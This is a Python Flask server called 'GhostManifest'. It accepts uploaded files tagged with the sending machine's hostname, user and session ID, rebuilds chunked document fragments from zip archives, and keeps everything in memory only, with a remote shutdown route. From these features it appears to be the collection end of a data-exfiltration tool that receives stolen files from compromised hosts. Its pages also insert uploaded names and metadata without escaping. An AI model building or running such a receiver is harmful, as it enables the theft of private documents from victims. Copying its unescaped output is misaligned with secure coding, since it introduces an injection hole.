from flask import Flask, send_file, request, render_template_string, Response
import os, sys, traceback, threading, time, io, zipfile
from datetime import datetime
import base64

app = Flask(__name__)

memory_storage = {}
server_state = "running"
start_time = datetime.now()

def get_state():
    global server_state
    return server_state

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    
def reassemble_from_zip(zip_data):
    """
    Checks a zip file in memory for .partX files and reassembles them.
    Returns a list of reassembled file info.
    """
    reassembled_files = []
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
            chunk_files = [name for name in zf.namelist() if 'documents/chunks/' in name and '.part' in name]
            if not chunk_files:
                return [] 

            base_files = {}
            for chunk_path in chunk_files:
                base_name = chunk_path.split('documents/chunks/')[1].rsplit('.part', 1)[0]
                if base_name not in base_files:
                    base_files[base_name] = []
                base_files[base_name].append(chunk_path)

            assembled_dir = "assembled_files"
            if not os.path.exists(assembled_dir):
                os.makedirs(assembled_dir)

            for base_name, parts in base_files.items():
                parts.sort(key=lambda x: int(x.split('.part')[-1]))
                
                output_path = os.path.join(assembled_dir, base_name)
                with open(output_path, 'wb') as outfile:
                    for part_path in parts:
                        with zf.open(part_path) as part_file:
                            outfile.write(part_file.read())
                
                reassembled_files.append({
                    'name': base_name,
                    'path': output_path,
                    'size': os.path.getsize(output_path)
                })
                print(f"[+] Reassembled {base_name} from {len(parts)} chunks.")

    except Exception as e:
        print(f"[-] Error during reassembly: {e}")
        
    return reassembled_files

@app.route("/shutdown", methods=["POST"])
def shutdown():
    global server_state
    state = request.args.get("state", "hardstop")
    server_state = state
    
    def kill():
        time.sleep(1)
        os._exit(0)

    threading.Thread(target=kill).start()
    return "Server shutting down...", 200

@app.route("/")
def home():
    try:
        state = get_state()
        files = list(memory_storage.keys())

        html = """
        <html>
        <head><title>GhostManifest File Manager</title></head>
        <body style="background:#111; color:#eee; text-align:center; font-family:sans-serif;">
            {% if state == 'supervisor' %}
                <h2 style="color:orange;">Supervisor Mode — GhostManifest Server is currently offline</h2>
            {% endif %}
            <h1>File/Memory Storage ({{ files|length }} items)</h1>
            <p style="color:#888;">Server uptime: {{ uptime }}</p>

            {% for f in files %}
                <div style="margin:10px; padding:10px; background:#222; border-radius:5px;">
                    <a href="/view/{{ f }}" style="color:#4af; text-decoration:none; cursor:pointer;">
                        {{ f }}
                    </a>
                    <a href="/download/{{ f }}" style="color:#aaa; margin-left:15px;">[Download]</a>
                    <a href="/delete/{{ f }}" style="color:#f44; margin-left:15px;" onclick="return confirm('Delete this file?')">[Delete]</a>
                </div>
            {% endfor %}

            {% if not files %}
                <p>No files have been uploaded to memory.</p>
            {% endif %}
        </body>
        </html>
        """
        
        uptime = str(datetime.now() - start_time).split('.')[0]
        return render_template_string(html, files=files, state=state, uptime=uptime)

    except Exception:
        return f"<pre>{traceback.format_exc()}</pre>", 500

@app.route("/upload", methods=["POST"])
def upload_file():
    try:
        if "file" not in request.files:
            return "No file part", 400

        file = request.files["file"]
        if file.filename == "":
            return "No selected file", 400

        file_data = file.read()
        file_info = {
            'data': file_data,
            'filename': file.filename,
            'content_type': file.content_type or 'application/octet-stream',
            'size': len(file_data),
            'upload_time': datetime.now(),
            'hostname': request.form.get('hostname', 'Unknown'),
            'user': request.form.get('user', 'Unknown'),
            'session_id': request.form.get('session_id', 'Unknown'),
            'timestamp': request.form.get('timestamp', 'Unknown')
        }
        
        memory_key = f"{file.filename}_{int(time.time())}"
        memory_storage[memory_key] = file_info
        
        reassembled = reassemble_from_zip(file_data)
        if reassembled:
            print(f"[*] Reassembled {len(reassembled)} files from upload {memory_key}.")
            file_info['reassembled_files'] = reassembled
        
        return f"File stored in memory: {memory_key}", 200

    except Exception as e:
        return f"Upload error: {e}", 500

@app.route("/view/<path:filename>")
def view_file(filename):
    try:
        file_info = None
        file_key = None
        
        for key, info in memory_storage.items():
            if filename in key:
                file_info = info
                file_key = key
                break
        
        if not file_info:
            return "File not found in memory", 404

        file_data = file_info['data']
        original_filename = file_info['filename']
        ext = original_filename.lower().split(".")[-1]

        if ext in ["png", "jpg", "jpeg", "gif", "bmp", "webp"]:
            return f"""
            <html>
            <body style='background:#111; color:#eee; text-align:center;'>
                <h2>{original_filename}</h2>
                <p style='color:#888;'>Size: {file_info['size']} bytes | Uploaded: {file_info['upload_time']}</p>
                <p style='color:#888;'>From: {file_info['hostname']} ({file_info['user']})</p>
                <img src="/download/{filename}" style="max-width:90%; border:2px solid #444;">
            </body>
            </html>
            """

        if ext in ["txt", "log", "json", "py", "md", "html", "css", "js", "cfg", "ini"]:
            try:
                content = file_data.decode('utf-8', errors='ignore')
                safe = content.replace("<", "&lt;").replace(">", "&gt;")
            except:
                safe = "[Binary content - cannot display as text]"

            return f"""
            <html>
            <body style='background:#111; color:#eee; padding:20px;'>
                <h2>{original_filename}</h2>
                <p style='color:#888;'>Size: {file_info['size']} bytes | Uploaded: {file_info['upload_time']}</p>
                <p style='color:#888;'>From: {file_info['hostname']} ({file_info['user']}) - Session: {file_info['session_id']}</p>
                <pre style="white-space:pre-wrap; background:#222; padding:15px; border-radius:8px; max-height:500px; overflow-y:auto;">{safe}</pre>
            </body>
            </html>
            """

        return send_file(io.BytesIO(file_data), 
                        download_name=original_filename,
                        as_attachment=True)

    except Exception as e:
        return f"Error: {e}", 500

@app.route("/download/<filename>")
def download_file(filename):
    try:
        file_info = None
        file_key = None
        
        for key, info in memory_storage.items():
            if filename in key:
                file_info = info
                file_key = key
                break
        
        if not file_info:
            return "File not found in memory", 404

        return send_file(io.BytesIO(file_info['data']), 
                        download_name=file_info['filename'],
                        as_attachment=True)
    except Exception as e:
        return str(e), 404

@app.route("/delete/<filename>", methods=["GET", "POST"])
def delete_file(filename):
    try:
        file_key = None
        for key in memory_storage.keys():
            if filename in key:
                file_key = key
                break
        
        if file_key:
            del memory_storage[file_key]
            return f"File {filename} deleted from memory", 200
        else:
            return "File not found in memory", 404
            
    except Exception as e:
        return f"Delete error: {e}", 500

@app.route("/memory_status")
def memory_status():
    try:
        total_files = len(memory_storage)
        total_size = sum(info['size'] for info in memory_storage.values())
        
        status = f"""
        <html>
        <body style='background:#111; color:#eee; padding:20px; font-family:monospace;'>
            <h2>Memory Storage Status</h2>
            <p>Total Files: {total_files}</p>
            <p>Total Size: {total_size / (1024*1024):.2f} MB</p>
            <p>Server Uptime: {datetime.now() - start_time}</p>
            <hr>
            <h3>File Details:</h3>
        """
        
        for key, info in memory_storage.items():
            status += f"""
            <div style='margin:10px; padding:10px; background:#222;'>
                <strong>{info['filename']}</strong><br>
                Size: {info['size']} bytes<br>
                From: {info['hostname']} ({info['user']})<br>
                Session: {info['session_id']}<br>
                Uploaded: {info['upload_time']}
            </div>
            """
        
        status += "</body></html>"
        return status
        
    except Exception as e:
        return f"Error: {e}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    print("Starting Ghost Manifest Server...")
    print("All data will be stored in memory only")
    print("Access the web interface at http://localhost:5000")
